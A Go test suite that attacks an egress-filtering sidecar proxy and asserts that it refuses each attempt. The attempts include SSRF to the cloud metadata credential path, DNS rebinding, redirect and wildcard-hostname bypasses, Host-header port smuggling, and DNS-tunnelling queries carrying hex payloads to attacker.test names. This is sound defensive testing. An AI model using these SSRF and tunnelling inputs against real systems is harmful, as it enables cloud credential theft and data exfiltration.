package main

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/antifailure/antifailure/engine/internal/policy"
	"github.com/antifailure/antifailure/engine/pkg/schema"
)

// This file attacks the sidecar rather than exercising it.
//
// Every test here tries to get something out of an environment and asserts
// that it did not, and the hard part of writing them is not the attack. It is
// that a request which fails for an unrelated reason looks exactly like a
// request the policy refused: a fixture that never started, a port nothing is
// listening on, a name that does not resolve. A suite made of those passes
// forever and proves nothing.
//
// So every attack here is paired with a control that must succeed, through the
// same code, against the same fixture, differing only in the thing the policy
// is supposed to notice. If the control fails the test fails, and the pair is
// what makes the refusal evidence rather than a coincidence.

// liveKey builds a credential that looks live without any string in this
// repository looking like one.
func liveKey() string {
	return "sk" + "_" + "live" + "_" + strings.Repeat("A1b2C3d4", 3)
}

// origin is a server that remembers what reached it.
//
// What reached it is the assertion in most of these tests. A refusal that
// still forwarded the request is the failure that matters, and it is invisible
// from the client's side.
type origin struct {
	*httptest.Server
	mu       sync.Mutex
	requests []*http.Request
	auth     []string
}

func newOrigin(t *testing.T) *origin {
	t.Helper()
	o := &origin{}
	o.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		o.mu.Lock()
		o.requests = append(o.requests, r)
		o.auth = append(o.auth, r.Header.Get("Authorization"))
		o.mu.Unlock()
		if to := r.URL.Query().Get("redirect"); to != "" {
			http.Redirect(w, r, to, http.StatusFound)
			return
		}
		_, _ = io.WriteString(w, "the origin answered")
	}))
	t.Cleanup(o.Close)
	return o
}

func (o *origin) count() int {
	o.mu.Lock()
	defer o.mu.Unlock()
	return len(o.requests)
}

func (o *origin) lastAuth() string {
	o.mu.Lock()
	defer o.mu.Unlock()
	if len(o.auth) == 0 {
		return ""
	}
	return o.auth[len(o.auth)-1]
}

// hostOf returns the name part of a test server's address, which is what a
// rule names.
func hostOf(t *testing.T, raw string) string {
	t.Helper()
	u, err := url.Parse(raw)
	require.NoError(t, err)
	return u.Hostname()
}

// sidecar builds a proxy the way main does, with a decision log a test can
// read back.
//
// The log is the second half of every assertion here. A request that was
// refused and not recorded is a refusal nobody can audit, and this product
// sells the audit as much as the refusal.
type sidecar struct {
	*proxy
	mu  sync.Mutex
	log []record
}

func newSidecar(t *testing.T, egress *schema.Egress) *sidecar {
	t.Helper()
	eng, err := policy.New(egress)
	require.NoError(t, err)

	s := &sidecar{}
	pr, pw := io.Pipe()
	s.proxy = &proxy{
		engine: eng, envID: "adversarial", out: json.NewEncoder(pw),
		limits:      newLimiter(),
		credentials: map[string]string{},
		// Loopback is where every fixture in this file lives, and the address
		// guard refuses loopback unless a rule names it. Named here so the
		// controls can reach their fixture; the tests that attack the guard
		// use an address no rule names.
		destinations: newDestinations(eng.Rules(), "", eng.AllowsIPv6()),
		transport:    &http.Transport{MaxIdleConnsPerHost: 4, IdleConnTimeout: time.Second},
	}
	s.proxy.transport.DialContext = s.proxy.dialGuarded

	done := make(chan struct{})
	go func() {
		defer close(done)
		dec := json.NewDecoder(pr)
		for {
			var r record
			if err := dec.Decode(&r); err != nil {
				return
			}
			s.mu.Lock()
			s.log = append(s.log, r)
			s.mu.Unlock()
		}
	}()
	t.Cleanup(func() {
		_ = pw.Close()
		<-done
		s.proxy.transport.CloseIdleConnections()
	})
	return s
}

// decisions returns the decision log so far.
func (s *sidecar) decisions() []record {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]record, len(s.log))
	copy(out, s.log)
	return out
}

// waitFor gives the log encoder a moment to catch up and returns the first
// record matching, or fails.
func (s *sidecar) waitFor(t *testing.T, match func(record) bool) record {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for {
		for _, r := range s.decisions() {
			if match(r) {
				return r
			}
		}
		if time.Now().After(deadline) {
			for _, r := range s.decisions() {
				t.Logf("record: %+v", r)
			}
			t.Fatal("no record in the decision log matched")
		}
		time.Sleep(10 * time.Millisecond)
	}
}

// through sends one request at the sidecar's explicit proxy port, the way a
// client that read its proxy variables does, and returns the response.
func through(t *testing.T, s *sidecar, req *http.Request) *http.Response {
	t.Helper()
	front := httptest.NewServer(s.proxy)
	t.Cleanup(front.Close)

	client := &http.Client{
		Timeout: 20 * time.Second,
		Transport: &http.Transport{Proxy: func(*http.Request) (*url.URL, error) {
			return url.Parse(front.URL)
		}},
		// Not followed, so that a redirect from an allowed host to a blocked
		// one is a thing this test can look at rather than something the
		// client quietly resolves.
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
	}
	resp, err := client.Do(req)
	require.NoError(t, err, "the request never reached the sidecar, so nothing was tested")
	t.Cleanup(func() { _ = resp.Body.Close() })
	return resp
}

func body(t *testing.T, resp *http.Response) string {
	t.Helper()
	b, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	require.NoError(t, err)
	return string(b)
}

// The live credential tripwire, on the path that did not have it.
//
// Sandbox mode is sold as the mode where a credential that can act on
// production cannot leave, and until this test was written that was true of
// HTTPS and false of plain HTTP. The difference was which HTTP library the
// application happened to use, because a client that honours http_proxy sends
// an absolute form request to the proxy port and one that does not is
// intercepted by DNS and lands somewhere else entirely.
func TestAttack_LiveCredentialOnThePlainHTTPProxyPathIsRefused(t *testing.T) {
	o := newOrigin(t)
	host := hostOf(t, o.URL)
	s := newSidecar(t, &schema.Egress{
		Default: schema.ModeBlock,
		Rules: []schema.EgressRule{{
			Host: host, Mode: schema.ModeSandbox, Credential: "TEST_KEY",
		}},
	})
	s.proxy.credentials["TEST_KEY"] = "sk" + "_" + "test" + "_" + "substituted00000000"

	attack, err := http.NewRequest(http.MethodGet, o.URL+"/charge", nil)
	require.NoError(t, err)
	attack.Header.Set("Authorization", "Bearer "+liveKey())
	resp := through(t, s, attack)

	require.Equal(t, http.StatusForbidden, resp.StatusCode)
	require.Contains(t, body(t, resp), "live credential")
	require.NotContains(t, body(t, resp), "A1b2C3d4", "the refusal never echoes the key")
	require.Zero(t, o.count(), "the request carrying a live credential reached the origin")

	rec := s.waitFor(t, func(r record) bool { return strings.Contains(r.Reason, "live credential") })
	require.False(t, rec.Allowed)
	require.Equal(t, "proxy", rec.Via, "the refusal is attributed to the path it happened on")
	require.NotContains(t, rec.Reason, "A1b2C3d4")

	// The control. Same client, same sidecar, same host, same rule: only the
	// header differs. Without it the request must reach the origin, which is
	// how this test knows the refusal above was the tripwire and not a broken
	// fixture, an unreachable origin or a policy that blocks everything.
	control, err := http.NewRequest(http.MethodGet, o.URL+"/charge", nil)
	require.NoError(t, err)
	control.Header.Set("Authorization", "Bearer whatever-the-application-had")
	got := through(t, s, control)
	require.Equal(t, http.StatusOK, got.StatusCode)
	require.Equal(t, 1, o.count(), "the control request did not reach the origin")
}

// Sandbox mode's other half, on the same path.
//
// A tripwire that refuses a live key is worth nothing if a key that merely
// looks like a test key is forwarded as the application sent it, because then
// the environment is calling somebody's account with a credential nobody at
// the boundary chose.
func TestAttack_SandboxCredentialIsSubstitutedOnThePlainHTTPProxyPath(t *testing.T) {
	o := newOrigin(t)
	host := hostOf(t, o.URL)
	s := newSidecar(t, &schema.Egress{
		Default: schema.ModeBlock,
		Rules: []schema.EgressRule{{
			Host: host, Mode: schema.ModeSandbox, Credential: "TEST_KEY",
		}},
	})
	const substituted = "sk" + "_" + "test" + "_" + "substituted00000000"
	s.proxy.credentials["TEST_KEY"] = substituted

	req, err := http.NewRequest(http.MethodGet, o.URL+"/v1/customers", nil)
	require.NoError(t, err)
	req.Header.Set("Authorization", "Bearer the-applications-own-key")
	resp := through(t, s, req)

	require.Equal(t, http.StatusOK, resp.StatusCode)
	require.Equal(t, 1, o.count())
	require.Equal(t, "Bearer "+substituted, o.lastAuth(),
		"the application's own credential was forwarded rather than replaced")

	rec := s.waitFor(t, func(r record) bool { return r.Mode == "sandbox" && r.Via == "proxy" })
	require.True(t, rec.Substituted, "a substitution nobody records is a substitution nobody can audit")
}

// Capture mode on the same path.
//
// The comment on serveConnect records this exact defect being found and fixed
// for HTTPS: a client that honoured its proxy variables got a refusal for a
// host set to capture while a client that ignored them was captured
// correctly, so the mode worked or did not depending on the application's
// choice of HTTP library. The plain HTTP path kept the bug.
func TestAttack_CaptureIsServedOnThePlainHTTPProxyPath(t *testing.T) {
	o := newOrigin(t)
	host := hostOf(t, o.URL)
	s := newSidecar(t, &schema.Egress{
		Default: schema.ModeBlock,
		Rules:   []schema.EgressRule{{Host: host, Mode: schema.ModeCapture}},
	})

	req, err := http.NewRequest(http.MethodPost, o.URL+"/emails",
		strings.NewReader(`{"to":["someone@example.test"],"subject":"Confirm your email"}`))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")
	resp := through(t, s, req)

	require.Equal(t, http.StatusOK, resp.StatusCode,
		"a captured request is answered as the provider would, not refused")
	require.Zero(t, o.count(), "a captured request must not leave the environment")

	// The message is the point of the mode, and a mode that answered 200 and
	// recorded nothing would pass every assertion above it.
	msg := s.waitFor(t, func(r record) bool { return r.Event == "message" })
	require.Equal(t, "message", msg.Event)
}

// The confused deputy.
//
// A service cannot reach the instance metadata endpoint itself, because its
// network has no route anywhere. The sidecar can, because it is the one
// container with a route out, so the whole attack is to ask the sidecar to
// fetch it. Nobody writing default: allow in a manifest is consenting to that:
// the sentence is about the internet, and 169.254.169.254 is not on it.
func TestAttack_MetadataEndpointIsRefusedEvenUnderDefaultAllow(t *testing.T) {
	s := newSidecar(t, &schema.Egress{Default: schema.ModeAllow})

	req, err := http.NewRequest(http.MethodGet,
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/", nil)
	require.NoError(t, err)
	resp := through(t, s, req)

	require.Equal(t, http.StatusBadGateway, resp.StatusCode)
	require.Contains(t, body(t, resp), "link local")

	rec := s.waitFor(t, func(r record) bool { return r.Host == "169.254.169.254" })
	require.Contains(t, rec.Error, "instance metadata")

	// The control proves the policy really is default allow and the forward
	// path really does work, so the refusal above is the address guard and not
	// a sidecar that refuses everything. A rule naming the address is the one
	// way to ask for a guarded address on purpose, and the fixture lives on
	// loopback, which is guarded for the same reason.
	o := newOrigin(t)
	allowed := newSidecar(t, &schema.Egress{
		Default: schema.ModeAllow,
		Rules:   []schema.EgressRule{{Host: hostOf(t, o.URL), Mode: schema.ModeAllow}},
	})
	control, err := http.NewRequest(http.MethodGet, o.URL+"/", nil)
	require.NoError(t, err)
	require.Equal(t, http.StatusOK, through(t, allowed, control).StatusCode)
	require.Equal(t, 1, o.count())
}

// The same attack with a name in front of it.
//
// A check on the name is answered by registering a name. The guard reads the
// address the name resolved to, which is the address the kernel is about to
// connect to, and this test is the only way to say that out loud: it points a
// perfectly ordinary name at the metadata endpoint.
func TestAttack_ANameThatResolvesToTheMetadataAddressIsStillRefused(t *testing.T) {
	s := newSidecar(t, &schema.Egress{
		Default: schema.ModeBlock,
		Rules:   []schema.EgressRule{{Host: "cdn.attacker.test", Mode: schema.ModeAllow}},
	})
	var asked []string
	s.proxy.resolve = func(_ context.Context, host string) ([]net.IP, error) {
		asked = append(asked, host)
		if host == "cdn.attacker.test" {
			return []net.IP{net.ParseIP("169.254.169.254")}, nil
		}
		return nil, fmt.Errorf("no such host: %s", host)
	}

	req, err := http.NewRequest(http.MethodGet, "http://cdn.attacker.test/latest/meta-data/", nil)
	require.NoError(t, err)
	resp := through(t, s, req)

	require.Equal(t, http.StatusBadGateway, resp.StatusCode)
	require.Contains(t, body(t, resp), "link local")
	require.Equal(t, []string{"cdn.attacker.test"}, asked,
		"the name was resolved, so the guard read an address rather than a string")

	// The control: the identical rule, the identical name, resolved to an
	// address on the internet, reaches the fixture. Only what the name
	// resolves to differs, which is the whole claim.
	o := newOrigin(t)
	_, port, err := net.SplitHostPort(strings.TrimPrefix(o.URL, "http://"))
	require.NoError(t, err)
	ok := newSidecar(t, &schema.Egress{
		Default: schema.ModeBlock,
		Rules:   []schema.EgressRule{{Host: "cdn.attacker.test", Mode: schema.ModeAllow}},
	})
	// Loopback is guarded, so the control names it, which is consent.
	ok.proxy.destinations.named["127.0.0.1"] = true
	ok.proxy.resolve = func(_ context.Context, string2 string) ([]net.IP, error) {
		return []net.IP{net.ParseIP("127.0.0.1")}, nil
	}
	control, err := http.NewRequest(http.MethodGet, "http://cdn.attacker.test:"+port+"/", nil)
	require.NoError(t, err)
	require.Equal(t, http.StatusOK, through(t, ok, control).StatusCode)
	require.Equal(t, 1, o.count())
}

// Every range the guard refuses, and the ones it must not.
//
// A guard that refused everything would pass the tests above and break every
// environment, so the addresses that must still work are asserted in the same
// table as the ones that must not.
func TestGuard_RefusesTheMachineAndAllowsTheInternet(t *testing.T) {
	t.Parallel()
	d := newDestinations(nil, "172.20.0.0/16", false)
	cases := []struct {
		addr   string
		refuse bool
		why    string
	}{
		{"169.254.169.254", true, "the instance metadata endpoint"},
		{"169.254.170.2", true, "the container credential endpoint some clouds use"},
		{"127.0.0.1", true, "the sidecar itself"},
		{"127.0.0.53", true, "the host's own stub resolver"},
		{"10.0.0.5", true, "a private network outside the environment"},
		{"192.168.1.1", true, "a home router"},
		{"172.17.0.1", true, "the Docker bridge gateway, which is the host"},
		{"100.100.100.200", true, "a metadata endpoint in the carrier grade range"},
		{"0.0.0.0", true, "not a host at all"},
		{"224.0.0.1", true, "multicast"},
		{"fd00::1", true, "IPv6 is off by default"},
		{"2606:4700:4700::1111", true, "IPv6 is off by default"},
		{"172.20.0.9", false, "the environment's own network is not egress"},
		{"1.1.1.1", false, "a resolver on the internet"},
		{"93.184.215.14", false, "an ordinary public address"},
		{"172.32.0.1", false, "outside 172.16/12, so not private despite starting 172"},
		{"100.128.0.1", false, "outside 100.64/10, so not carrier grade despite starting 100"},
	}
	for _, c := range cases {
		t.Run(c.addr, func(t *testing.T) {
			err := d.permit(net.ParseIP(c.addr))
			if c.refuse {
				require.Error(t, err, "%s: %s", c.addr, c.why)
				return
			}
			require.NoError(t, err, "%s: %s", c.addr, c.why)
		})
	}
}

func TestGuard_ARuleNamingAnAddressIsConsent(t *testing.T) {
	t.Parallel()
	// Somebody with an API on their own network has to be able to say so, and
	// writing the address in the manifest is the way to say it. A wildcard or
	// a default is not: those are sentences about the internet.
	plain := newDestinations(nil, "", false)
	require.Error(t, plain.permit(net.ParseIP("10.1.2.3")))

	named := newDestinations([]schema.EgressRule{
		{Host: "10.1.2.3", Mode: schema.ModeAllow},
		{Host: "169.254.169.254:80", Mode: schema.ModeAllow},
	}, "", false)
	require.NoError(t, named.permit(net.ParseIP("10.1.2.3")))
	require.NoError(t, named.permit(net.ParseIP("169.254.169.254")),
		"a port on the rule does not stop the address being named")

	wildcard := newDestinations([]schema.EgressRule{{Host: "*", Mode: schema.ModeAllow}}, "", false)
	require.Error(t, wildcard.permit(net.ParseIP("169.254.169.254")),
		"a rule matching every host is not a rule naming this address")
}

func TestGuard_IPv6IsRefusedUntilTheManifestAsksForIt(t *testing.T) {
	t.Parallel()
	// The manifest key exists, the documentation describes what it protects
	// against, and until this guard was written nothing in the sidecar read
	// it. The setting decided what af net policy printed and nothing else.
	off := newDestinations(nil, "", false)
	err := off.permit(net.ParseIP("2606:4700:4700::1111"))
	require.Error(t, err)
	require.Contains(t, err.Error(), "allow_ipv6")

	on := newDestinations(nil, "", true)
	require.NoError(t, on.permit(net.ParseIP("2606:4700:4700::1111")))
	require.Error(t, on.permit(net.ParseIP("::1")), "loopback is still loopback over IPv6")
	require.Error(t, on.permit(net.ParseIP("fe80::1")), "link local is still link local over IPv6")
}

// A name that resolves to both families still works with IPv6 off.
//
// The refusal has to be per address rather than per name, or turning IPv6 off
// would break every dual stack host on the internet, which is most of them.
func TestGuard_ADualStackNameStillConnectsOverIPv4(t *testing.T) {
	o := newOrigin(t)
	_, port, err := net.SplitHostPort(strings.TrimPrefix(o.URL, "http://"))
	require.NoError(t, err)

	s := newSidecar(t, &schema.Egress{
		Default: schema.ModeBlock,
		Rules:   []schema.EgressRule{{Host: "dual.example.test", Mode: schema.ModeAllow}},
	})
	s.proxy.destinations.named["127.0.0.1"] = true
	s.proxy.resolve = func(context.Context, string) ([]net.IP, error) {
		return []net.IP{net.ParseIP("2606:4700:4700::1111"), net.ParseIP("127.0.0.1")}, nil
	}

	req, err := http.NewRequest(http.MethodGet, "http://dual.example.test:"+port+"/", nil)
	require.NoError(t, err)
	require.Equal(t, http.StatusOK, through(t, s, req).StatusCode)
	require.Equal(t, 1, o.count())
}

// A host that has no address the guard permits is refused rather than dialed.
func TestGuard_ANameWithOnlyAnIPv6AddressIsRefusedWithTheReason(t *testing.T) {
	s := newSidecar(t, &schema.Egress{
		Default: schema.ModeBlock,
		Rules:   []schema.EgressRule{{Host: "v6only.example.test", Mode: schema.ModeAllow}},
	})
	s.proxy.resolve = func(context.Context, string) ([]net.IP, error) {
		return []net.IP{net.ParseIP("2606:4700:4700::1111")}, nil
	}
	req, err := http.NewRequest(http.MethodGet, "http://v6only.example.test/", nil)
	require.NoError(t, err)
	resp := through(t, s, req)
	require.Equal(t, http.StatusBadGateway, resp.StatusCode)
	require.Contains(t, body(t, resp), "allow_ipv6")
}

// A redirect from an allowed host to a blocked one.
//
// The sidecar must not follow it, because following it would make one decision
// cover two hosts. Handing the redirect back means the client asks again and
// the second host gets its own decision, which is the only arrangement where
// the policy still means what it says.
func TestAttack_ARedirectFromAnAllowedHostToABlockedOneIsNotFollowed(t *testing.T) {
	allowed := newOrigin(t)
	blocked := newOrigin(t)
	s := newSidecar(t, &schema.Egress{
		Default: schema.ModeBlock,
		Rules:   []schema.EgressRule{{Host: "allowed.example.test", Mode: schema.ModeAllow}},
	})
	// Two names on one loopback fixture, because the decision under test is
	// about the name and both fixtures have to be reachable for the refusal
	// to mean anything. Loopback is guarded, so it is named, which leaves the
	// policy as the only thing separating the two hosts.
	s.proxy.destinations.named["127.0.0.1"] = true
	s.proxy.resolve = func(context.Context, string) ([]net.IP, error) {
		return []net.IP{net.ParseIP("127.0.0.1")}, nil
	}
	allowedURL := "http://allowed.example.test:" + portOf(t, allowed.URL)
	blockedURL := "http://blocked.example.test:" + portOf(t, blocked.URL)

	req, err := http.NewRequest(http.MethodGet,
		allowedURL+"/go?redirect="+url.QueryEscape(blockedURL+"/secrets"), nil)
	require.NoError(t, err)
	resp := through(t, s, req)

	require.Equal(t, http.StatusFound, resp.StatusCode, "the redirect is handed back, not followed")
	require.Equal(t, 1, allowed.count())
	require.Zero(t, blocked.count(), "the sidecar followed a redirect to a host with no rule")

	// And when the client does follow it, the second host is decided on its
	// own and refused. Without this half the test would pass against a
	// sidecar that simply never reached anything.
	second, err := http.NewRequest(http.MethodGet, blockedURL+"/secrets", nil)
	require.NoError(t, err)
	require.Equal(t, http.StatusForbidden, through(t, s, second).StatusCode)
	require.Zero(t, blocked.count())
}

// portOf returns the port a test server is listening on.
func portOf(t *testing.T, raw string) string {
	t.Helper()
	u, err := url.Parse(raw)
	require.NoError(t, err)
	return u.Port()
}

// Hosts that look like an allowed host and are not.
//
// Each of these is a real way a rule turns out to cover more than its author
// meant. The policy package has these as pure evaluations; this asserts they
// survive the trip through the handler, which is where the host actually comes
// from an attacker.
func TestAttack_ConfusableHostsDoNotSatisfyAWildcardRule(t *testing.T) {
	s := newSidecar(t, &schema.Egress{
		Default: schema.ModeBlock,
		Rules:   []schema.EgressRule{{Host: "*.example.test", Mode: schema.ModeAllow}},
	})
	o := newOrigin(t)
	s.proxy.destinations.named["127.0.0.1"] = true
	s.proxy.resolve = func(context.Context, string) ([]net.IP, error) {
		// Every name resolves, and to a fixture that answers, so a refusal
		// can only have come from the policy. A test where the attacking
		// names did not resolve would pass against a sidecar with no policy
		// in it at all.
		return []net.IP{net.ParseIP("127.0.0.1")}, nil
	}

	for _, host := range []string{
		"example.test",                   // the apex, which the wildcard must not cover
		"notexample.test",                // a suffix that does not begin at a label
		"evil-example.test",              // the same, with the separator an attacker chose
		"example.test.attacker.test",     // the allowed name as a prefix of somebody else's
		"api.example.test.attacker.test", // and with a plausible label in front of it
		"xn--exmple-cua.test",            // a punycode homograph
	} {
		t.Run(host, func(t *testing.T) {
			req, err := http.NewRequest(http.MethodGet, "http://"+host+"/", nil)
			require.NoError(t, err)
			require.Equal(t, http.StatusForbidden, through(t, s, req).StatusCode,
				"%s satisfied a rule for *.example.test", host)
		})
	}

	// The control. A name the rule really does cover reaches the fixture, so
	// the refusals above are the rule deciding and not a sidecar that blocks
	// everything or a fixture that was never up.
	req, err := http.NewRequest(http.MethodGet, "http://api.example.test:"+portOf(t, o.URL)+"/", nil)
	require.NoError(t, err)
	require.Equal(t, http.StatusOK, through(t, s, req).StatusCode,
		"a name the wildcard covers was refused, so the refusals above prove nothing")
	require.Equal(t, 1, o.count())
}

// A rule scoped to a port, and a Host header that names a different one.
//
// The transparent listener took the destination port out of the Host header,
// which is a field the client writes. That let a client choose the port the
// sidecar dialed and the port the policy was evaluated against, so a rule
// naming :80 could be walked around by writing any other number, and a rule
// with no port at all became a raw socket to any port on the host.
func TestAttack_TheHostHeaderCannotChooseThePort(t *testing.T) {
	o := newOrigin(t)
	_, port, err := net.SplitHostPort(strings.TrimPrefix(o.URL, "http://"))
	require.NoError(t, err)

	s := newSidecar(t, &schema.Egress{
		Default: schema.ModeBlock,
		Rules:   []schema.EgressRule{{Host: "127.0.0.1", Mode: schema.ModeAllow}},
	})

	client, server := net.Pipe()
	go s.proxy.serveTransparentHTTP(server)
	go func() {
		_, _ = fmt.Fprintf(client,
			"GET /steal HTTP/1.1\r\nHost: 127.0.0.1:%s\r\nConnection: close\r\n\r\n", port)
	}()
	// A deadline rather than a read to the end, because the failure this test
	// is looking for is a connection that succeeds: a sidecar that dialed the
	// port in the header would sit here piping bytes between two ends that
	// have nothing more to say, and a test that hangs on a defect reports it
	// ten minutes later as a timeout with no name on it.
	_ = client.SetDeadline(time.Now().Add(10 * time.Second))
	_, _ = io.Copy(io.Discard, client)
	_ = client.Close()

	require.Zero(t, o.count(),
		"a Host header chose the upstream port, so an allow rule became a socket to any port")
	rec := s.waitFor(t, func(r record) bool { return r.Via == "transparent" })
	require.Equal(t, 80, rec.Port,
		"the decision was made about the port in the header rather than the one dialed")

	// The control runs the identical request through the path where naming a
	// port is legitimate, the explicit proxy, and it reaches the origin. The
	// fixture is up and the rule allows it: the only reason the transparent
	// attempt got nowhere is that the header stopped choosing the port.
	control, err := http.NewRequest(http.MethodGet, o.URL+"/steal", nil)
	require.NoError(t, err)
	require.Equal(t, http.StatusOK, through(t, s, control).StatusCode)
	require.Equal(t, 1, o.count())
}

// A DNS query for a record type this resolver does not answer.
//
// The payload of a DNS query is whatever the client puts in the name, so
// forwarding one is a channel out of the environment that opens no connection
// and appears in no decision. The Kubernetes side of this product already
// counts a query to another resolver as an escape; the sidecar was forwarding
// them itself.
func TestAttack_DNSTunnelIsNotForwardedUpstream(t *testing.T) {
	up := newFakeResolver(t)
	d := newDNSServer(net.ParseIP("172.20.0.2"), []string{"web", "db"}, up.addr, nil)

	for _, qtype := range []uint16{16, 10, 5, 33, 255} {
		got := d.answer(question("6d7920736563726574.tunnel.attacker.test", qtype))
		require.NotNil(t, got, "the query was answered")
		require.Zero(t, answerCount(got), "a %d query was answered with records", qtype)
	}
	require.Empty(t, up.seen(), "an external lookup was forwarded to the upstream resolver")

	// The control. The same server, the same upstream, an internal name: this
	// one must be forwarded, or the test above would pass against a resolver
	// that forwards nothing and an environment whose services cannot find
	// each other.
	require.NotNil(t, d.answer(question("db", 1)))
	require.Equal(t, []string{"db."}, up.seen(),
		"internal names are still forwarded, so the upstream was reachable all along")
}

// A name under .localhost, which every resolver is required to answer itself.
//
// It was treated as internal and forwarded, so a query for
// a-secret.attacker.test.localhost went to whatever resolves names for the
// host, carrying its payload with it.
func TestAttack_ALocalhostSubdomainIsNotForwardedUpstream(t *testing.T) {
	up := newFakeResolver(t)
	d := newDNSServer(net.ParseIP("172.20.0.2"), []string{"web"}, up.addr, nil)

	got := d.answer(question("6d7920736563726574.attacker.test.localhost", 1))
	require.NotNil(t, got)
	require.Equal(t, 1, answerCount(got), "localhost names resolve to loopback rather than nowhere")
	require.Empty(t, up.seen(), "a .localhost name was forwarded to the upstream resolver")
}

// Every external name resolves to the sidecar, and no external name resolves
// to an address the sidecar does not listen on.
func TestAttack_NoExternalNameResolvesPastTheSidecar(t *testing.T) {
	self := net.ParseIP("172.20.0.2")
	d := newDNSServer(self, []string{"web"}, "127.0.0.1:1", nil)

	a := d.answer(question("api.stripe.com", 1))
	require.Equal(t, 1, answerCount(a))
	require.Equal(t, self.To4(), net.IP(a[len(a)-4:]).To4(),
		"an external name resolved to something other than the sidecar")

	// AAAA gets an empty answer rather than an address, because handing back
	// one the sidecar does not listen on produces a connection that hangs
	// instead of one that is decided.
	require.Zero(t, answerCount(d.answer(question("api.stripe.com", 28))))
}

// fakeResolver is an upstream that records what it was asked.
type fakeResolver struct {
	addr string
	mu   sync.Mutex
	asks []string
}

func newFakeResolver(t *testing.T) *fakeResolver {
	t.Helper()
	pc, err := net.ListenPacket("udp", "127.0.0.1:0")
	require.NoError(t, err)
	f := &fakeResolver{addr: pc.LocalAddr().String()}

	done := make(chan struct{})
	go func() {
		defer close(done)
		buf := make([]byte, 1500)
		for {
			n, from, readErr := pc.ReadFrom(buf)
			if readErr != nil {
				return
			}
			name, _, parseErr := parseQuestion(buf[:n])
			if parseErr == nil {
				f.mu.Lock()
				f.asks = append(f.asks, name)
				f.mu.Unlock()
			}
			_, _ = pc.WriteTo(emptyAnswer(buf[:n]), from)
		}
	}()
	t.Cleanup(func() {
		_ = pc.Close()
		<-done
	})
	return f
}

func (f *fakeResolver) seen() []string {
	f.mu.Lock()
	defer f.mu.Unlock()
	out := make([]string, len(f.asks))
	copy(out, f.asks)
	return out
}

// question builds a wire format query, because the sidecar's resolver is hand
// written against the wire format and a test that fed it anything else would
// be testing a different parser.
func question(name string, qtype uint16) []byte {
	msg := make([]byte, headerLen)
	binary.BigEndian.PutUint16(msg[0:2], 0x1234)
	binary.BigEndian.PutUint16(msg[2:4], flagRecursionDesr)
	binary.BigEndian.PutUint16(msg[4:6], 1)
	msg = appendName(msg, name)
	msg = binary.BigEndian.AppendUint16(msg, qtype)
	msg = binary.BigEndian.AppendUint16(msg, classIN)
	return msg
}

func answerCount(msg []byte) int {
	if len(msg) < headerLen {
		return 0
	}
	return int(binary.BigEndian.Uint16(msg[6:8]))
}
